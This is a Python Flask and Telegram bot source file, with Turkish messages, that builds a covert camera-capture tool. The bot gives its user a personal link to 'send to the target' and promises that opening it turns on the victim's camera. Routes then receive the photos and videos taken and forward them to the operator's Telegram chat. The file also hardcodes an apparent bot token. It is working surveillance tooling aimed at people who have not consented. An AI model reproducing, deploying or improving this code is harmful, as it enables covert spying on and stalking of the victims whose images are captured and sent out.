import os
import logging
import uuid
import base64
from io import BytesIO
from flask import Flask, request, send_from_directory
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, Bot
from telegram.ext import Application, CommandHandler, ContextTypes

# ==================== CONFIG ====================
TOKEN = os.environ.get("BOT_TOKEN", "8845469880:AAEEENGVv_igk7_DzrgMdK2UGG9Dnzva8VY")

# Railway domain
RAILWAY_DOMAIN = os.environ.get("RAILWAY_PUBLIC_DOMAIN") or os.environ.get("RAILWAY_STATIC_URL")
if RAILWAY_DOMAIN:
    WEBHOOK_URL = f"https://{RAILWAY_DOMAIN}"
else:
    WEBHOOK_URL = os.environ.get("WEBHOOK_URL", "https://your-app.up.railway.app")

PORT = int(os.environ.get("PORT", 5000))

# Kullanıcı verileri
user_tokens = {}

# Logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Flask app
app = Flask(__name__, static_folder='static')

# Telegram Bot Application
bot_app = Application.builder().token(TOKEN).build()

# ==================== HANDLERS ====================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username or "Bilinmiyor"

    token = str(uuid.uuid4()).replace("-", "")[:16]
    user_tokens[token] = {
        "user_id": user_id,
        "username": username,
        "chat_id": update.effective_chat.id
    }

    link = f"{WEBHOOK_URL}/c/{token}"

    keyboard = [[InlineKeyboardButton("📸 Linke Git", url=link)]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await update.message.reply_text(
        f"👋 Merhaba @{username}!

"
        f"📎 **Özel Linkiniz:**
`{link}`

"
        f"🔗 Bu linki hedefe gönderin.
"
        f"📱 Hedef linke tıklayınca kamera otomatik açılır!
"
        f"📸 Fotoğraf çekilip size anında gönderilir.",
        parse_mode="Markdown",
        reply_markup=reply_markup
    )

bot_app.add_handler(CommandHandler("start", start))

# ==================== FLASK ROUTES ====================
@app.route(f"/{TOKEN}", methods=["POST"])
def telegram_webhook():
    json_data = request.get_json()
    update = Update.de_json(json_data, bot_app.bot)

    # asyncio event loop kullan
    import asyncio
    try:
        loop = asyncio.get_event_loop()
    except RuntimeError:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)

    loop.run_until_complete(bot_app.process_update(update))
    return "OK", 200

@app.route("/c/<token>")
def capture_page(token):
    if token not in user_tokens:
        return "<h1>Link geçersiz!</h1>", 404
    return send_from_directory("static", "capture.html")

@app.route("/upload/<token>", methods=["POST"])
def upload_photo(token):
    if token not in user_tokens:
        return {"error": "Invalid token"}, 403

    data = request.get_json()
    image_data = data.get("image", "")

    if not image_data:
        return {"error": "No image"}, 400

    user_info = user_tokens[token]
    chat_id = user_info["chat_id"]
    username = user_info["username"]

    try:
        image_bytes = base64.b64decode(image_data.split(",")[1])
    except:
        return {"error": "Invalid image"}, 400

    import asyncio
    try:
        loop = asyncio.get_event_loop()
    except RuntimeError:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)

    async def send():
        await bot_app.bot.send_photo(
            chat_id=chat_id,
            photo=BytesIO(image_bytes),
            caption=f"📸 Yeni Fotoğraf!

👤 Kullanıcı: @{username}
🔗 Token: `{token}`",
            parse_mode="Markdown"
        )

    loop.run_until_complete(send())
    return {"success": True}, 200

@app.route("/upload_video/<token>", methods=["POST"])
def upload_video(token):
    if token not in user_tokens:
        return {"error": "Invalid token"}, 403

    video_file = request.files.get("video")
    if not video_file:
        return {"error": "No video"}, 400

    user_info = user_tokens[token]
    chat_id = user_info["chat_id"]
    username = user_info["username"]

    import asyncio
    try:
        loop = asyncio.get_event_loop()
    except RuntimeError:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)

    async def send():
        await bot_app.bot.send_video(
            chat_id=chat_id,
            video=video_file.read(),
            caption=f"🎥 Yeni Video!

👤 Kullanıcı: @{username}",
            parse_mode="Markdown"
        )

    loop.run_until_complete(send())
    return {"success": True}, 200

@app.route("/")
def home():
    return "✅ Bot Aktif!"

# ==================== MAIN ====================
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=PORT)
